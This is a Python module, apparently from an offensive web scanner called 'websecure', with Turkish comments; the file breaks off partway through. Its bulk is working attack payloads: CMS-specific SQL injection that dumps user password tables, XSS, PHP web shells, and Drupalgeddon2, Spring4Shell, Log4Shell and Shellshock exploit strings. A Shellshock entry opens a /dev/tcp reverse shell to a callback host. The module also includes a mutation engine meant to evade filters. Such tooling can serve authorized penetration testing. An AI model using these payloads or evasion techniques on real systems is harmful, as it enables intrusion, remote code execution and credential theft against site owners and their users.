"""
websecure.core.payload_engine
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Üst düzey Wordlist & Payload Sistemi — Adım 18.

Bileşenler
----------
* **CMSFingerprinter**   — Tespit edilen teknoloji -> CMS/framework eşleme
* **CMSPayloadProfile**  — CMS özel payload profili (WP, Drupal, Laravel vb.)
* **PayloadMutationEngine** — Base payload -> n mutant varyant üretici
* **PayloadScorer**      — Başarı geçmişi tabanlı Bayesian payload sıralaması
* **CVEPayloadMap**      — CVE ID -> PoC payload haritası
* **EncodingVariantGenerator** — UTF-16, Base64, HTML entity, URL çift kodlama vb.
* **WordlistUpdater**    — Git/HTTP wordlist güncelleme mekanizması
* **PayloadEngine**      — Tüm bileşenleri birleştiren Facade

SOLID
-----
- SRP  : Her sınıf tek sorumlu.
- OCP  : Yeni CMS/mutasyon stratejisi eklemek için mevcut kod değişmez.
- LSP  : Tüm mutasyon stratejileri `MutationStrategy(ABC)` yerine geçer.
- ISP  : `Scoreable` / `Encodable` ayrı protocol.
- DIP  : `PayloadEngine`, soyut `MutationStrategy` listesi alır.
"""
from __future__ import annotations

import base64
import hashlib
import json
import logging
import math
import os
import re
import subprocess
import time
import urllib.parse
from abc import ABC, abstractmethod
from collections import defaultdict
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, FrozenSet, Iterable, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Proje kökleri
# ---------------------------------------------------------------------------

_PKG_ROOT = Path(__file__).resolve().parent.parent.parent
_WORDLIST_DIR = _PKG_ROOT / "websecure" / "wordlists"
_DATA_DIR = _PKG_ROOT / "websecure" / "data"
_SCORE_DB_PATH = Path.home() / ".websecure" / "payload_scores.json"
_CVE_PAYLOAD_PATH = _DATA_DIR / "cve_payloads.json"

# ---------------------------------------------------------------------------
# Sabitler
# ---------------------------------------------------------------------------

_MAX_MUTATIONS_PER_PAYLOAD = 20
_DEFAULT_MUTATION_VARIANTS = 8
_SCORE_MIN_TRIALS = 3        # Bu kadar denemeden önce score güvenilir değil
_UPDATER_TIMEOUT = 120       # Wordlist güncelleme zaman aşımı (sn)


# ============================================================================
# 1. CMS Fingerprinter
# ============================================================================

class CMSFingerprinter:
    """
    Tespit edilen teknoloji etiketlerinden CMS/framework belirler.

    Kullanım
    --------
    ```python
    fp = CMSFingerprinter()
    cms = fp.detect(["WordPress/6.4", "PHP/8.2", "Apache"])
    # cms -> "wordpress"
    ```
    """

    # tech_tag (küçük harf, substring) -> cms_name
    _CMS_MAP: Dict[str, str] = {
        # WordPress
        "wordpress":  "wordpress",
        "wp-content": "wordpress",
        "wp-includes":"wordpress",
        "woocommerce":"wordpress",
        # Drupal
        "drupal":     "drupal",
        "drupal/":    "drupal",
        # Joomla
        "joomla":     "joomla",
        "/joomla/":   "joomla",
        # Magento
        "magento":    "magento",
        "varien":     "magento",
        "mage/":      "magento",
        # PrestaShop
        "prestashop": "prestashop",
        "presta/":    "prestashop",
        # Laravel
        "laravel":    "laravel",
        "x-powered-by: laravel": "laravel",
        # Django
        "django":     "django",
        "csrftoken":  "django",
        # Rails
        "ruby on rails": "rails",
        "rails":      "rails",
        "rack":       "rails",
        # Spring
        "spring":     "spring",
        "spring-boot":"spring",
        "springboot": "spring",
        # ASP.NET
        "asp.net":    "aspnet",
        "aspnet":     "aspnet",
        "__viewstate":"aspnet",
        # Symfony
        "symfony":    "symfony",
        # Typo3
        "typo3":      "typo3",
        # SharePoint
        "sharepoint": "sharepoint",
        # GraphQL
        "graphql":    "graphql",
        # Flask
        "flask":      "flask",
        "werkzeug":   "flask",
        # Express.js
        "express":    "express",
        "x-powered-by: express": "express",
    }

    def detect(self, tech_tags: Iterable[str]) -> Optional[str]:
        """
        Teknoloji etiket listesinden CMS/framework tespiti.

        Döndürür
        --------
        str veya None — "wordpress", "drupal", "laravel" vb.
        """
        for tag in tech_tags:
            tag_lower = (tag or "").lower()
            for key, cms in self._CMS_MAP.items():
                if key in tag_lower:
                    logger.debug(f"[CMSFingerprint] Tespit: {cms!r} <- tag={tag!r}")
                    return cms
        return None

    def detect_multiple(self, tech_tags: Iterable[str]) -> List[str]:
        """Birden fazla CMS/framework tespit et (sıralı, tekrarsız)."""
        seen: Set[str] = set()
        result: List[str] = []
        for tag in tech_tags:
            tag_lower = (tag or "").lower()
            for key, cms in self._CMS_MAP.items():
                if key in tag_lower and cms not in seen:
                    seen.add(cms)
                    result.append(cms)
        return result


# ============================================================================
# 2. CMSPayloadProfile — CMS özel payload profilleri
# ============================================================================

@dataclass
class CMSPayloadProfile:
    """
    Belirli bir CMS/framework için optimize edilmiş payload profili.

    Alanlar
    -------
    cms             : CMS adı ("wordpress", "drupal" vb.)
    extra_paths     : Sadece bu CMS'te bulunan endpoint yolları
    plugin_paths    : Plugin/extension dizinleri
    admin_paths     : Admin panel yolları
    rce_payloads    : CMS-özel RCE payload'ları
    sqli_payloads   : CMS-özel SQLi payload'ları
    xss_payloads    : CMS-özel XSS vektörleri
    priority_params : Öncelikli test edilecek parametreler
    notes           : Güvenlik notları
    """
    cms: str
    extra_paths: List[str] = field(default_factory=list)
    plugin_paths: List[str] = field(default_factory=list)
    admin_paths: List[str] = field(default_factory=list)
    rce_payloads: List[str] = field(default_factory=list)
    sqli_payloads: List[str] = field(default_factory=list)
    xss_payloads: List[str] = field(default_factory=list)
    lfi_payloads: List[str] = field(default_factory=list)
    priority_params: List[str] = field(default_factory=list)
    wordlist_hints: List[str] = field(default_factory=list)
    notes: str = ""


# CMS profilleri — sektör lideri araçların bilgi bankasından derlendi
_CMS_PROFILES: Dict[str, CMSPayloadProfile] = {

    "wordpress": CMSPayloadProfile(
        cms="wordpress",
        extra_paths=[
            "/wp-login.php", "/wp-admin/", "/xmlrpc.php",
            "/wp-json/wp/v2/users", "/wp-cron.php",
            "/wp-content/debug.log", "/?author=1",
            "/wp-json/", "/wp-sitemap.xml",
        ],
        plugin_paths=[
            "/wp-content/plugins/", "/wp-content/themes/",
            "/wp-content/uploads/",
        ],
        admin_paths=["/wp-admin/admin-ajax.php", "/wp-admin/options.php"],
        sqli_payloads=[
            "1 AND SLEEP(5)--",
            "' UNION SELECT user_login,user_pass,3 FROM wp_users--",
            "1 AND (SELECT 1 FROM wp_users LIMIT 1)=1--",
        ],
        xss_payloads=[
            "<script>alert(document.cookie)</script>",
            '"><img src=x onerror=alert(1)>',
            "<svg/onload=alert(1)>",
        ],
        rce_payloads=[
            "<?php system($_GET['cmd']); ?>",
            "<?php passthru($_POST['cmd']); ?>",
        ],
        lfi_payloads=[
            "../../../../wp-config.php",
            "../wp-content/uploads/malicious.php",
        ],
        priority_params=["s", "p", "page_id", "cat", "tag", "author", "m", "paged"],
        wordlist_hints=["wordpress", "wp-plugins", "wp-themes"],
        notes="XML-RPC brute force, user enum /?author=N, plugin vuln scan",
    ),

    "drupal": CMSPayloadProfile(
        cms="drupal",
        extra_paths=[
            "/user/login", "/admin/", "/CHANGELOG.txt",
            "/sites/default/settings.php", "/update.php",
            "/?q=user/login", "/node/1", "/user/register",
            "/?q=admin/", "/sites/all/modules/",
        ],
        plugin_paths=["/sites/all/modules/", "/sites/all/themes/", "/sites/default/files/"],
        admin_paths=["/admin/config", "/admin/modules"],
        sqli_payloads=[
            "1 AND SLEEP(5)--",
            "' UNION SELECT name,pass,3,4,5,6,7 FROM users--",
        ],
        xss_payloads=[
            "<script>alert(1)</script>",
            '"><img src=x onerror=alert(document.domain)>',
        ],
        rce_payloads=[
            # Drupalgeddon2
            "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
            "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=",
        ],
        priority_params=["q", "page", "sort", "order", "view_name", "display_id"],
        wordlist_hints=["drupal", "drupal-modules"],
        notes="Drupalgeddon (SA-CORE-2014-005, CVE-2018-7600) priority check",
    ),

    "joomla": CMSPayloadProfile(
        cms="joomla",
        extra_paths=[
            "/administrator/", "/configuration.php",
            "/htaccess.txt", "/web.config.txt",
            "/?option=com_users&view=login",
            "/components/", "/modules/", "/plugins/",
        ],
        plugin_paths=["/components/", "/modules/", "/plugins/", "/templates/"],
        admin_paths=["/administrator/index.php"],
        sqli_payloads=[
            "' UNION SELECT username,password,3 FROM jos_users--",
            "1 AND SLEEP(5)--",
        ],
        xss_payloads=['"><script>alert(1)</script>', "<svg onload=alert(1)>"],
        priority_params=["option", "view", "layout", "task", "format", "id", "Itemid"],
        wordlist_hints=["joomla", "joomla-components"],
        notes="Component SQL injection, com_users enum",
    ),

    "magento": CMSPayloadProfile(
        cms="magento",
        extra_paths=[
            "/admin/", "/downloader/", "/app/etc/local.xml",
            "/shell/", "/magmi/", "/var/log/system.log",
            "/api/rest/", "/index.php/api/",
        ],
        plugin_paths=["/app/code/community/", "/app/code/local/"],
        admin_paths=["/admin/index/index/key/"],
        sqli_payloads=[
            "' UNION SELECT 1,email,password_hash,4,5,6,7,8 FROM customer_entity--",
            "1 AND SLEEP(5)--",
        ],
        xss_payloads=["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>'],
        priority_params=["id", "product", "category", "q", "order", "dir"],
        wordlist_hints=["magento", "ecommerce"],
        notes="Magmi interface, downloader RCE, admin path brute",
    ),

    "prestashop": CMSPayloadProfile(
        cms="prestashop",
        extra_paths=[
            "/admin/", "/config/settings.inc.php",
            "/modules/", "/themes/", "/cache/",
            "/api/", "/webservice/",
        ],
        plugin_paths=["/modules/", "/themes/"],
        admin_paths=["/admin/index.php"],
        sqli_payloads=["' UNION SELECT 1,email,passwd FROM ps_employee--"],
        xss_payloads=["<script>alert(1)</script>"],
        priority_params=["id_product", "id_category", "id_manufacturer", "q", "controller"],
        wordlist_hints=["prestashop"],
        notes="Module SQLi, admin path enum",
    ),

    "laravel": CMSPayloadProfile(
        cms="laravel",
        extra_paths=[
            "/.env", "/storage/logs/laravel.log",
            "/vendor/", "/telescope", "/horizon",
            "/api/", "/sanctum/csrf-cookie",
            "/storage/framework/sessions/",
        ],
        plugin_paths=["/vendor/"],
        admin_paths=["/telescope", "/horizon"],
        sqli_payloads=["' OR SLEEP(5)--", "1 AND 1=1--"],
        xss_payloads=["{{7*7}}", "{{config}}", "{{app.key}}"],  # SSTI + Blade
        rce_payloads=[
            # Laravel Debug RCE (APP_DEBUG=true)
            "?token={{base64_encode(file_get_contents('/etc/passwd'))}}",
        ],
        lfi_payloads=["../../../.env", "../../storage/logs/laravel.log"],
        priority_params=["_token", "page", "per_page", "sort", "filter", "search"],
        wordlist_hints=["laravel", "php-framework"],
        notes=".env exposure, Telescope/Horizon exposure, APP_DEBUG RCE",
    ),

    "django": CMSPayloadProfile(
        cms="django",
        extra_paths=[
            "/admin/", "/static/admin/", "/api/",
            "/accounts/login/", "/__debug__/",
            "/media/", "/favicon.ico",
        ],
        admin_paths=["/admin/"],
        sqli_payloads=["' OR '1'='1", "1 AND SLEEP(5)--"],
        xss_payloads=["<script>alert(1)</script>", "{{7*7}}"],
        priority_params=["csrfmiddlewaretoken", "next", "username", "password", "page", "search"],
        wordlist_hints=["django", "python-framework"],
        notes="Debug page info leak, admin enum, SSTI in templates",
    ),

    "spring": CMSPayloadProfile(
        cms="spring",
        extra_paths=[
            "/actuator", "/actuator/env", "/actuator/health",
            "/actuator/mappings", "/actuator/beans",
            "/actuator/httptrace", "/actuator/loggers",
            "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
            "/h2-console", "/api/",
        ],
        admin_paths=["/actuator/"],
        rce_payloads=[
            # Spring4Shell CVE-2022-22965
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di java.io.InputStream",
            # SpEL injection
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
        sqli_payloads=["' OR SLEEP(5)--", "1 AND 1=1"],
        xss_payloads=["<script>alert(1)</script>", "${<img src=x onerror=alert(1)>}"],
        priority_params=["class", "spring.cloud.config", "trace", "debug"],
        wordlist_hints=["spring", "java", "actuator"],
        notes="Actuator exposure, Spring4Shell RCE, SpEL injection, H2 console",
    ),

    "graphql": CMSPayloadProfile(
        cms="graphql",
        extra_paths=["/graphql", "/graphiql", "/api/graphql", "/gql", "/playground"],
        sqli_payloads=[],
        xss_payloads=[],
        rce_payloads=[
            # Introspection
            '{"query":"{__schema{types{name}}}"}',
            # Field suggestion DoS
            '{"query":"{aliasTest:__typename}"}',
            # Batch query
            '[{"query":"{__typename}"},{"query":"{__typename}"}]',
        ],
        priority_params=["query", "variables", "operationName"],
        wordlist_hints=["graphql", "api"],
        notes="Introspection, mutation fuzzing, batch query DoS, field suggestion",
    ),
}


def get_cms_profile(cms_name: str) -> Optional[CMSPayloadProfile]:
    """CMS adına göre profil döndür."""
    return _CMS_PROFILES.get((cms_name or "").lower())


def get_cms_payloads(
    cms_name: str,
    category: str,
    limit: int = 50,
) -> List[str]:
    """
    Belirli CMS ve kategori için özel payload listesi döndür.

    Parametreler
    ------------
    cms_name : "wordpress", "drupal", "laravel" vb.
    category : "sqli", "xss", "rce", "lfi", "paths"
    limit    : Maksimum payload sayısı

    Döndürür
    --------
    List[str] — CMS-özel payload'lar
    """
    profile = get_cms_profile(cms_name)
    if profile is None:
        return []

    cat = (category or "").lower()
    if cat in ("sqli", "sql"):
        payloads = profile.sqli_payloads
    elif cat == "xss":
        payloads = profile.xss_payloads
    elif cat in ("rce", "cmdi"):
        payloads = profile.rce_payloads
    elif cat == "lfi":
        payloads = profile.lfi_payloads
    elif cat in ("paths", "dirs", "discovery"):
        payloads = profile.extra_paths + profile.plugin_paths + profile.admin_paths
    else:
        payloads = (
            profile.sqli_payloads
            + profile.xss_payloads
            + profile.rce_payloads
            + profile.lfi_payloads
        )

    return payloads[:limit]


# ============================================================================
# 3. Payload Mutasyon Motoru
# ============================================================================

class MutationStrategy(ABC):
    """Payload mutasyon stratejisi — OCP/LSP için soyut temel."""

    @abstractmethod
    def apply(self, payload: str) -> List[str]:
        """Payload'dan mutant varyantlar üret."""
        ...

    @property
    @abstractmethod
    def name(self) -> str:
        ...


class CaseMutation(MutationStrategy):
    """Büyük/küçük harf permütasyonları."""
    name = "case"

    def apply(self, payload: str) -> List[str]:
        variants = [payload.upper(), payload.lower()]
        # Rastgele/alternatif büyüklük: SeLeCt
        alt = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        if alt not in variants:
            variants.append(alt)
        return variants


class CommentInjectionMutation(MutationStrategy):
    """SQL/JS comment enjeksiyonu."""
    name = "comment"

    _SQL_KEYWORDS = ["SELECT", "UNION", "WHERE", "FROM", "AND", "OR",
                     "INSERT", "UPDATE", "DELETE", "ORDER", "GROUP", "HAVING"]
    _JS_KEYWORDS = ["script", "alert", "eval", "onerror", "onload", "svg"]

    def apply(self, payload: str) -> List[str]:
        variants = []
        p = payload
        # SQL comment: SELECT -> SE/**/LECT
        for kw in self._SQL_KEYWORDS:
            if kw in p.upper():
                variants.append(re.sub(re.escape(kw), kw[:2] + "/**/" + kw[2:], p, flags=re.IGNORECASE, count=1))
                break
        # MySQL hash comment
        variants.append(p.replace(" ", "/**/"))
        # URL-encoded space
        variants.append(p.replace(" ", "%20"))
        return [v for v in variants if v != payload][:3]


class URLEncodingMutation(MutationStrategy):
    """URL encoding varyantları."""
    name = "url_encode"

    def apply(self, payload: str) -> List[str]:
        single = urllib.parse.quote(payload, safe="")
        double = urllib.parse.quote(single, safe="")
        partial = re.sub(r"[<>\"';&]", lambda m: urllib.parse.quote(m.group()), payload)
        return list({single, double, partial} - {payload})[:3]


class HTMLEntityMutation(MutationStrategy):
    """HTML entity encoding."""
    name = "html_entity"

    _ENTITY_MAP = {
        "<":  ["&lt;", "&#60;", "&#x3c;", "&#X3C;"],
        ">":  ["&gt;", "&#62;", "&#x3e;"],
        '"':  ["&quot;", "&#34;", "&#x22;"],
        "'":  ["&#39;", "&#x27;", "&apos;"],
        "&":  ["&amp;", "&#38;"],
        "/":  ["&#47;", "&#x2f;"],
    }

    def apply(self, payload: str) -> List[str]:
        variants = set()
        # Tek karakter encode
        for char, entities in self._ENTITY_MAP.items():
            if char in payload:
                for ent in entities[:2]:
                    variants.add(payload.replace(char, ent, 1))
        # Tüm özel karakterleri encode
        full = "".join(
            self._ENTITY_MAP.get(c, [c])[0] if c in self._ENTITY_MAP else c
            for c in payload
        )
        variants.add(full)
        return list(variants - {payload})[:4]


class WhitespaceMutation(MutationStrategy):
    """Boşluk karakter varyasyonları."""
    name = "whitespace"

    _WS_CHARS = ["\t", "\n", "\r\n", "\r", "\x0b", "\x0c", "\xa0", "%09", "%0a", "%0d"]

    def apply(self, payload: str) -> List[str]:
        variants = []
        for ws in self._WS_CHARS[:5]:
            variants.append(payload.replace(" ", ws))
        return [v for v in variants if v != payload][:4]


class NullByteMutation(MutationStrategy):
    """Null byte enjeksiyonu."""
    name = "null_byte"

    def apply(self, payload: str) -> List[str]:
        return [
            payload + "\x00",
            payload + "%00",
            payload + "\x00.jpg",
            payload.replace(".", "\x00."),
        ][:3]


class UnicodeEscapeMutation(MutationStrategy):
    """Unicode escape varyantları."""
    name = "unicode"

    def apply(self, payload: str) -> List[str]:
        variants = []
        # \uXXXX escape
        escaped = "".join(
            f"\\u{ord(c):04x}" if ord(c) > 127 or c in "<>\"'" else c
            for c in payload
        )
        if escaped != payload:
            variants.append(escaped)
        # Homoglyph replacement (örn. a->a, Cyrillic)
        # Basit: 'a' -> 'a' (Kiril a)
        homogl = payload.replace("a", "a").replace("e", "e")
        if homogl != payload:
            variants.append(homogl)
        return variants[:3]


class Base64Mutation(MutationStrategy):
    """Base64 / eval(atob()) varyantları."""
    name = "base64"

    def apply(self, payload: str) -> List[str]:
        b64 = base64.b64encode(payload.encode()).decode()
        variants = [
            f"eval(atob('{b64}'))",
            f"<script>eval(atob('{b64}'))</script>",
            f"; echo {b64} | base64 -d | sh;",
        ]
        return variants[:2]


class ConcatenationMutation(MutationStrategy):
    """String concatenation / split varyantları."""
    name = "concat"

    def apply(self, payload: str) -> List[str]:
        if len(payload) < 6:
            return []
        mid = len(payload) // 2
        # SQL: 'ab' -> 'a'||'b'
        sql_concat = f"'{payload[:mid]}'||'{payload[mid:]}'"
        # JS: 'ab' -> 'a'+'b'
        js_concat = f"'{payload[:mid]}'"+"+'"+ payload[mid:]+"'"
        # PHP: 'ab' -> 'a'.'b'
        php_concat = f"'{payload[:mid]}'"+"."+"'{payload[mid:]}'"
        return [sql_concat, js_concat][:2]


class PayloadMutationEngine:
    """
    Base payload'dan otomatik mutant varyantlar üretir.

    Strateji listesi açık-kapalı prensibine göre genişletilebilir.
    Her strateji bağımsız olarak açılıp kapatılabilir.

    Kullanım
    --------
    ```python
    engine = PayloadMutationEngine()
    variants = engine.mutate("' OR SLEEP(5)--", max_variants=10)
    ```
    """

    _DEFAULT_STRATEGIES: List[MutationStrategy] = [
        CaseMutation(),
        CommentInjectionMutation(),
        URLEncodingMutation(),
        HTMLEntityMutation(),
        WhitespaceMutation(),
        NullByteMutation(),
        UnicodeEscapeMutation(),
        Base64Mutation(),
        ConcatenationMutation(),
    ]

    def __init__(
        self,
        strategies: Optional[List[MutationStrategy]] = None,
        max_variants: int = _DEFAULT_MUTATION_VARIANTS,
    ) -> None:
        self.strategies = strategies or self._DEFAULT_STRATEGIES
        self.max_variants = max_variants

    def mutate(
        self,
        payload: str,
        max_variants: Optional[int] = None,
        strategies: Optional[List[str]] = None,
    ) -> List[str]:
        """
        Tekil payload için mutant varyantlar üret.

        Parametreler
        ------------
        payload      : Orijinal payload
        max_variants : Üretilecek maksimum varyant sayısı
        strategies   : Sadece bu isimdeki stratejileri kullan

        Döndürür
        --------
        List[str] — Orijinal payload dahil tüm varyantlar (dedup edilmiş)
        """
        limit = max_variants or self.max_variants
        result: List[str] = [payload]
        seen: Set[str] = {payload}

        active = self.strategies
        if strategies:
            active = [s for s in self.strategies if s.name in strategies]

        for strategy in active:
            if len(result) >= limit:
                break
            try:
                variants = strategy.apply(payload)
                for v in variants:
                    if v and v not in seen and len(result) < limit:
                        seen.add(v)
                        result.append(v)
            except Exception as exc:
                logger.debug(f"[Mutation:{strategy.name}] Hata: {exc!r}")

        return result

    def mutate_all(
        self,
        payloads: List[str],
        max_per_payload: int = 5,
        total_limit: Optional[int] = None,
    ) -> List[str]:
        """
        Payload listesini toplu mutasyona uğrat.

        Parametreler
        ------------
        payloads       : Base payload listesi
        max_per_payload: Her payload için maksimum varyant
        total_limit    : Toplam çıktı limiti

        Döndürür
        --------
        List[str] — Orijinal + tüm mutantlar (dedup edilmiş)
        """
        all_payloads: List[str] = []
        seen: Set[str] = set()

        for payload in payloads:
            variants = self.mutate(payload, max_variants=max_per_payload)
            for v in variants:
                if v not in seen:
                    seen.add(v)
                    all_payloads.append(v)
            if total_limit and len(all_payloads) >= total_limit:
                break

        return all_payloads[:total_limit] if total_limit else all_payloads

    def available_strategies(self) -> List[str]:
        return [s.name for s in self.strategies]


# ============================================================================
# 4. Payload Scorer — Bayesian başarı geçmişi tabanlı sıralama
# ============================================================================

class PayloadScorer:
    """
    Payload başarı geçmişine dayalı Bayesian sıralama motoru.

    Başarılı payload'lar daha yüksek öncelik alır.
    Bulgular JSON dosyasında kalıcı olarak saklanır.

    Score Formülü
    -------------
    score = (success_count + alpha) / (total_count + alpha + beta)

    alpha=1, beta=1 -> Laplace düzeltmesi (sıfır-deneme sorunu önleme)
    """

    _ALPHA = 1.0   # Bayesian prior — başarı
    _BETA = 1.0    # Bayesian prior — başarısızlık

    def __init__(self, db_path: Optional[Path] = None) -> None:
        self._db_path = db_path or _SCORE_DB_PATH
        self._db: Dict[str, Dict[str, float]] = {}
        self._dirty = False
        self._load()

    # ------------------------------------------------------------------
    # CRUD
    # ------------------------------------------------------------------

    def record_success(self, payload: str, category: str) -> None:
        """Payload başarısını kaydet."""
        key = self._key(payload, category)
        entry = self._db.setdefault(key, {"s": 0.0, "t": 0.0})
        entry["s"] += 1.0
        entry["t"] += 1.0
        self._dirty = True

    def record_failure(self, payload: str, category: str) -> None:
        """Payload başarısızlığını kaydet."""
        key = self._key(payload, category)
        entry = self._db.setdefault(key, {"s": 0.0, "t": 0.0})
        entry["t"] += 1.0
        self._dirty = True

    def score(self, payload: str, category: str) -> float:
        """
        0.0-1.0 arası Bayesian başarı skoru döndür.

        Hiç denenmemiş payload için 0.5 (tarafsız prior) döner.
        """
        key = self._key(payload, category)
        entry = self._db.get(key)
        if entry is None or entry.get("t", 0) < _SCORE_MIN_TRIALS:
            return 0.5  # Prior
        s = entry.get("s", 0.0)
        t = entry.get("t", 0.0)
        return (s + self._ALPHA) / (t + self._ALPHA + self._BETA)

    def rank(
        self,
        payloads: List[str],
        category: str,
        top_k: Optional[int] = None,
    ) -> List[str]:
        """
        Payload listesini başarı skoruna göre sırala (yüksek -> düşük).

        Parametreler
        ------------
        payloads : Sıralanacak payload listesi
        category : Payload kategorisi ("sqli", "xss" vb.)
        top_k    : Sadece ilk K payload döndür

        Döndürür
        --------
        List[str] — Sıralı payload listesi
        """
        scored = [(p, self.score(p, category)) for p in payloads]
        scored.sort(key=lambda x: x[1], reverse=True)
        result = [p for p, _ in scored]
        return result[:top_k] if top_k else result

    def top_payloads(
        self,
        category: str,
        limit: int = 20,
        min_score: float = 0.6,
    ) -> List[Tuple[str, float]]:
        """
        Belirli kategori için en yüksek skorlu payload'ları döndür.

        Döndürür
        --------
        List[Tuple[str, float]] — (payload, score) çiftleri
        """
        cat_key_prefix = f"{category}:"
        results: List[Tuple[str, float]] = []

        for key, entry in self._db.items():
            if not key.startswith(cat_key_prefix):
                continue
            t = entry.get("t", 0)
            if t < _SCORE_MIN_TRIALS:
                continue
            s = entry.get("s", 0.0)
            sc = (s + self._ALPHA) / (t + self._ALPHA + self._BETA)
            if sc >= min_score:
                # key = "category:payload_hash" — payload'ı restore edemeyiz
                # Bu yüzden sadece hash'i döndürüyoruz
                results.append((key[len(cat_key_prefix):], sc))

        results.sort(key=lambda x: x[1], reverse=True)
        return results[:limit]

    # ------------------------------------------------------------------
    # Kalıcılık
    # ------------------------------------------------------------------

    def save(self) -> None:
        if not self._dirty:
            return
        self._db_path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self._db_path.with_suffix(".tmp")
        tmp.write_text(
            json.dumps(self._db, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )
        tmp.replace(self._db_path)
        self._dirty = False
        logger.debug(f"[PayloadScorer] DB kaydedildi: {self._db_path}")

    def _load(self) -> None:
        if not self._db_path.exists():
            return
        try:
            self._db = json.loads(self._db_path.read_text(encoding="utf-8"))
        except Exception as exc:
            logger.debug(f"[PayloadScorer] DB yükleme hatası: {exc!r}")

    @staticmethod
    def _key(payload: str, category: str) -> str:
        """Payload fingerprint — payload'u olduğu gibi saklamak yerine hash kullan."""
        ph = hashlib.sha256(payload.encode()).hexdigest()[:16]
        return f"{category}:{ph}"

    def stats(self) -> Dict[str, Any]:
        """İstatistik özeti."""
        total = len(self._db)
        has_data = sum(1 for e in self._db.values() if e.get("t", 0) >= _SCORE_MIN_TRIALS)
        return {"total_entries": total, "scored_entries": has_data}


# ============================================================================
# 5. CVE Payload Map
# ============================================================================

# Yerleşik CVE -> PoC payload haritası (en yaygın web CVE'leri)
_BUILTIN_CVE_PAYLOADS: Dict[str, Dict[str, Any]] = {
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "category": "rce",
        "payloads": [
            "${jndi:ldap://{{CALLBACK}}/exploit}",
            "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{{CALLBACK}}/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{CALLBACK}}/a}",
            "${jndi:${lower:l}${lower:d}a${lower:p}://{{CALLBACK}}/a}",
            "${jndi:dns://{{CALLBACK}}/exploit}",
            "${jndi:rmi://{{CALLBACK}}/exploit}",
        ],
        "headers": ["X-Api-Version", "User-Agent", "X-Forwarded-For", "Referer", "X-Client-IP"],
        "cwe": "CWE-502",
        "cvss": 10.0,
        "severity": "Critical",
    },
    "CVE-2022-22965": {
        "name": "Spring4Shell",
        "category": "rce",
        "payloads": [
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di java.io.InputStream in = %25%7B''.class.forName('java.lang.Runtime').getMethod('exec',''.class.forName('[Ljava.lang.String;')).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),new String[]{'id'})%25%7D%{suffix}i",
        ],
        "cwe": "CWE-94",
        "cvss": 9.8,
        "severity": "Critical",
    },
    "CVE-2022-26134": {
        "name": "Confluence OGNL RCE",
        "category": "rce",
        "payloads": [
            "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/",
            "/${@java.lang.Runtime@getRuntime().exec(new String[]{\"id\"})}/",
        ],
        "cwe": "CWE-74",
        "cvss": 10.0,
        "severity": "Critical",
    },
    "CVE-2021-22205": {
        "name": "GitLab ExifTool RCE",
        "category": "rce",
        "payloads": [
            "AT&T\"; id > /tmp/pwned; echo \"",
        ],
        "cwe": "CWE-78",
        "cvss": 10.0,
        "severity": "Critical",
    },
    "CVE-2018-7600": {
        "name": "Drupalgeddon2",
        "category": "rce",
        "payloads": [
            "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
        ],
        "cwe": "CWE-20",
        "cvss": 9.8,
        "severity": "Critical",
    },
    "CVE-2014-6271": {
        "name": "Shellshock",
        "category": "rce",
        "payloads": [
            "() { :; }; echo; echo; /bin/bash -c 'id'",
            "() { :;}; wget http://{{CALLBACK}}/shellshock",
            "() { :; }; /bin/bash -i >& /dev/tcp/{{CALLBACK_HOST}}/{{CALLBACK_PORT}} 0>&1",
        ],
        "headers": ["User-Agent", "Cookie", "Referer"],
        "cwe": "CWE-78",
        "cvss": 10.0,
        "severity": "Critical",
    },
    "CVE-2019-0708": {
        "name": "BlueKeep (RDP) — detection only",
        "category": "detection",
        "payloads": ["// Network-level vulnerability — use Nmap NSE: rdp-vuln-ms12-020"],
        "cvss": 9.8,
        "severity": "Critical",
    },
    "CVE-2021-41773": {
        "name": "Apache Path Traversal/RCE",
        "category": "lfi",
        "payloads": [
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        ],
        "cwe": "CWE-22",
        "cvss": 9.8,
        "severity": "Critical",
    },
    "CVE-2021-34473": {
        "name": "ProxyShell (Exchange)",
        "category": "ssrf",
        "payloads": [
            "/autodiscover/autodiscover.json?@foo.com/autodiscover/autodiscover.json%3f@foo.com",
            "/ecp/y.js?harmless=false/../../../../../Program Files/Microsoft/Exchange Server/V15/FrontEnd/HttpProxy/ecp/auth/TimeConfirmation.flt&X-BEResource=localhost~1942062522",
        ],
        "cvss": 9.8,
        "severity": "Critical",
    },
    "CVE-2022-1388": {
        "name": "F5 BIG-IP iControl REST Auth Bypass",
        "category": "auth_bypass",
        "payloads": [
            "X-F5-Auth-Token: ",
            "X-Forwarded-Host: 127.0.0.1",
        ],
        "cwe": "CWE-306",
        "cvss": 9.8,
        "severity": "Critical",
    },
}


class CVEPayloadMap:
    """
    CVE ID -> PoC payload haritası.

    Yerleşik CVE listesi + harici JSON dosyasından yükleme destekler.
    """

    def __init__(self, extra_db_path: Optional[Path] = None) -> None:
        self._map: Dict[str, Dict[str, Any]] = dict(_BUILTIN_CVE_PAYLOADS)
